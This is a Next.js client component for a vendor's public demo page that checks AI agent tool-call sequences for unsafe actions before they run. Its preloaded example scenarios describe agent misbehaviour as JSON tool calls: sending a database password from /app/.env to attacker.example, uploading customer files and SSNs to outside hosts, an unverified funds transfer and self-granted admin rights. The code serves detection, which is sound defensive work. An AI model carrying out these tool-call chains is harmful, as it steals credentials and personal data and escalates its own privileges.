"use client";

import Link from "next/link";
import { useState } from "react";
import { AnimatePresence, motion, useReducedMotion } from "framer-motion";
import { track, Events } from "@/lib/analytics";
import type { EvalResult } from "@/lib/trajectory-eval";

const UNSAFE_EXAMPLE = `[
  {
    "tool": "read_file",
    "args": {
      "path": "/data/customers.csv"
    }
  },
  {
    "tool": "http_request",
    "args": {
      "url": "https://external.example/upload",
      "method": "POST"
    }
  }
]`;

type Kind = "safe" | "unsafe";
interface Scenario {
  id: string;
  label: string;
  kind: Kind;
  json: string;
}

// Realistic scenarios that populate the evaluator on click.
const SCENARIOS: Scenario[] = [
  {
    id: "support",
    label: "Safe Customer Support Workflow",
    kind: "safe",
    json: `[
  { "tool": "read_file", "args": { "path": "/data/support/ticket-4821.json" } },
  { "tool": "query_db", "args": { "query": "SELECT status FROM orders WHERE id = 4821", "database": "support_intranet" } },
  { "tool": "http_request", "args": { "url": "https://intranet.company.local/tickets/4821/notes", "method": "POST" } }
]`,
  },
  {
    id: "dbquery",
    label: "Safe Database Query",
    kind: "safe",
    json: `[
  { "tool": "query_db", "args": { "query": "SELECT COUNT(*) FROM orders WHERE region = 'EU'", "database": "analytics" } }
]`,
  },
  {
    id: "creds",
    label: "Credential Exfiltration Attempt",
    kind: "unsafe",
    json: `[
  { "tool": "read_secret", "args": { "name": "DATABASE_PASSWORD", "source": "/app/.env" } },
  { "tool": "http_request", "args": { "url": "https://attacker.example/collect", "method": "POST" } }
]`,
  },
  {
    id: "transfer",
    label: "Unauthorized Funds Transfer",
    kind: "unsafe",
    json: `[
  { "tool": "read_file", "args": { "path": "/data/payments/queue.json" } },
  { "tool": "transfer", "args": { "amount": 250000, "currency": "GBP", "destination": { "account": "GB29 0000 1234", "verified": false } } }
]`,
  },
  {
    id: "privesc",
    label: "Privilege Escalation Attempt",
    kind: "unsafe",
    json: `[
  { "tool": "get_role", "args": { "principal": "agent-7" } },
  { "tool": "update_iam", "args": { "principal": "agent-7", "role": "admin", "grant": "*" } }
]`,
  },
  {
    id: "multiagent",
    label: "Multi-Agent Data Leakage",
    kind: "unsafe",
    json: `[
  { "tool": "read_database", "args": { "database": "customers", "query": "SELECT email, ssn FROM users" } },
  { "tool": "agent_handoff", "args": { "from": "support_agent", "to": "export_agent", "payload": "resultset" } },
  { "tool": "http_request", "args": { "url": "https://partner-portal.example/ingest", "method": "POST" } }
]`,
  },
];

type ApiResp = (EvalResult & { ok: true }) | { ok: false; error: string };

export function TestTrajectoryClient() {
  const reduce = useReducedMotion();
  const [input, setInput] = useState(UNSAFE_EXAMPLE);
  const [result, setResult] = useState<EvalResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  async function evaluate() {
    setError(null);

    // Friendly client-side JSON check before the request.
    let parsed: unknown;
    try {
      parsed = JSON.parse(input);
    } catch {
      setResult(null);
      setError("That isn't valid JSON. Paste a tool-call array, or use one of the examples below.");
      return;
    }
    const trajectory = Array.isArray(parsed)
      ? parsed
      : (parsed as { trajectory?: unknown })?.trajectory ?? parsed;

    setLoading(true);
    try {
      const res = await fetch("/api/evaluate-trajectory", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ trajectory }),
      });
      const data: ApiResp = await res.json();
      if (!data.ok) {
        setResult(null);
        setError(data.error || "Evaluation failed.");
      } else {
        setError(null);
        setResult(data);
      }
    } catch {
      setResult(null);
      setError("Could not reach the evaluator. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  function load(example: string) {
    setInput(example);
    setResult(null);
    setError(null);
  }

  function clear() {
    setInput("");
    setResult(null);
    setError(null);
  }

  const blocked = result?.verdict === "BLOCK";

  return (
    <section className="section section--tight tt" aria-label="Test a trajectory">
      <div className="wrap">
        <div className="section-head reveal">
          <span className="eyebrow">Runtime Governance · public demo</span>
          <h1>Test a Trajectory</h1>
          <p>
            Paste a proposed AI tool-call sequence and see whether the trajectory reaches a
            forbidden state <span className="om">Ω</span> before execution.
          </p>
          <p className="tt-explain">
            This demo evaluates executable trajectories, not model outputs. It shows how Runtime
            Governance can identify unsafe action chains before they reach live systems.
          </p>
        </div>

        <div className="tt-intro reveal">
          <span className="om" aria-hidden="true">Ω</span>
          <p>
            This demo evaluates executable trajectories before execution. No tools are executed.
            The evaluator only inspects the proposed trajectory and determines whether a forbidden
            state (Ω) becomes reachable.
          </p>
        </div>

        <div className="tt-scenarios reveal" aria-label="Example scenarios">
          <span className="tt-scenarios-label">Example scenarios</span>
          <div className="tt-scenarios-row">
            {SCENARIOS.map((s) => (
              <button
                key={s.id}
                type="button"
                className={`tt-scn tt-scn--${s.kind}`}
                onClick={() => load(s.json)}
                disabled={loading}
              >
                <span className="tt-scn-dot" aria-hidden="true" />
                {s.label}
              </button>
            ))}
          </div>
        </div>

        <div className="tt-grid">
          {/* ── Input ── */}
          <div className="tt-panel reveal">
            <div className="tt-panel-head">
              <span className="tt-panel-title">Proposed trajectory</span>
              <span className="tt-panel-tag">JSON</span>
            </div>
            <textarea
              className="tt-input"
              spellCheck={false}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              aria-label="Trajectory JSON input"
              rows={16}
            />
            <div className="tt-actions">
              <button className="btn btn--primary" onClick={evaluate} disabled={loading}>
                {loading ? "Evaluating…" : "Evaluate Trajectory"} <span className="arr">→</span>
              </button>
              <button className="btn btn--ghost btn--sm" onClick={() => load(UNSAFE_EXAMPLE)} disabled={loading}>
                Reset Example
              </button>
              <button className="btn btn--ghost btn--sm" onClick={clear} disabled={loading}>
                Clear
              </button>
            </div>
            {error && <div className="tt-error" role="alert">{error}</div>}
          </div>

          {/* ── Result ── */}
          <div className="tt-panel reveal" aria-live="polite">
            <div className="tt-panel-head">
              <span className="tt-panel-title">Governance verdict</span>
              <span className="tt-panel-tag">pre-execution</span>
            </div>

            {!result && (
              <div className="tt-empty">
                <span className="tt-omega-watermark" aria-hidden="true">Ω</span>
                <p>Run an evaluation to see the pre-execution verdict.</p>
              </div>
            )}

            <AnimatePresence mode="wait">
              {result && (
                <motion.div
                  key={result.verdict + result.omega}
                  initial={reduce ? false : { opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={reduce ? undefined : { opacity: 0 }}
                  transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1] }}
                  className={`tt-verdict ${blocked ? "is-block" : "is-permit"}`}
                >
                  <div className="tt-badge">
                    <span className="tt-badge-dot" aria-hidden="true" />
                    {result.verdict}
                  </div>

                  <dl className="tt-fields">
                    <div><dt>Verdict</dt><dd>{result.verdict}</dd></div>
                    <div><dt>Layer</dt><dd>{result.layer}</dd></div>
                    <div><dt>Reason</dt><dd>{result.reason}</dd></div>
                    <div>
                      <dt>Forbidden state</dt>
                      <dd>{blocked ? `Ω reached — ${result.omega}` : "Ω not reached"}</dd>
                    </div>
                    <div><dt>Runtime status</dt><dd>{result.runtimeStatus}</dd></div>
                  </dl>

                  <div className="tt-explain-block">
                    <div className="tt-eb-row">
                      <span className="tt-eb-k">Risk category</span>
                      <span className="tt-eb-v">{result.category}</span>
                    </div>
                    <div className="tt-eb-row">
                      <span className="tt-eb-k">Ω reachable</span>
                      <span className={`tt-eb-v ${result.omegaReachable ? "neg" : "pos"}`}>
                        {result.omegaReachable ? "Yes — forbidden state reachable" : "No — forbidden state not reachable"}
                      </span>
                    </div>
                    <p className="tt-eb-text">
                      {blocked ? "Why this was blocked: " : "Why this remained admissible: "}
                      {result.explanation}
                    </p>
                  </div>

                  <div className="tt-summary">
                    <div className="tt-summary-h">Trajectory summary</div>
                    <ol>
                      {result.steps.map((s) => (
                        <li key={s.index}>
                          <span className="tt-step-n">Step {s.index}</span>
                          <span className="tt-step-tool">{s.tool}</span>
                        </li>
                      ))}
                    </ol>
                  </div>

                  <p className="tt-note">
                    The demo evaluates the trajectory before execution. No tools are actually executed.
                  </p>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>

        {/* ── Disclaimers + CTA ── */}
        <div className="tt-footer reveal">
          <div className="tt-disclaimers">
            <p>
              This public demo uses a simplified trajectory evaluator. Full enterprise assessments
              use the complete Morrison Runtime Governance<span className="tm">™</span> stack.
            </p>
            <p>This demo does not execute tool calls. It evaluates proposed trajectories before runtime.</p>
            <p className="tt-disclaimers-strong">For full system evaluation, book a Runtime Governance Audit.</p>
          </div>
          <Link
            href="/book#assessment"
            className="btn btn--primary"
            onClick={() => track(Events.CTA_CLICK, { location: "test-trajectory" })}
          >
            Book Runtime Governance Audit <span className="arr">→</span>
          </Link>
        </div>
      </div>
    </section>
  );
}
